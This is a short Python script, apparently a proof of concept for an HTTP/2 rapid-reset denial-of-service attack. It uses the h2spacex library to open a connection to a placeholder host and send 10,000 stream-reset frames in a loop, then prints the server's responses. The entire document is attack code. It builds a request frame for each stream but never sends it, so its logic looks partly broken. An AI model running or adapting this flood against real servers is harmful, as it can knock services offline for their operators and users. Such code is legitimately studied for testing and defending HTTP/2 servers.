from h2spacex import H2OnTlsConnection
from h2spacex import h2_frames

h2_conn = H2OnTlsConnection(
    hostname='abc.example.com',
    port_number=443
)

h2_conn.setup_connection()

headers = """accept: */*
accept-encoding: deflate, gzip, br
"""

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=10000)

for s_id in stream_ids_list:
    request_frames = h2_conn.create_simple_http2_request(
        stream_id=s_id,
        headers_string=headers,
        authority='abc.example.com',
        scheme='https',
        method='GET',
        path='/',
    )

    reset_frame = h2_frames.create_reset_stream_frame(stream_id=s_id, error_code=0)
    h2_conn.send_bytes(bytes(reset_frame))

# parse response frames
resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

h2_conn.close_connection()
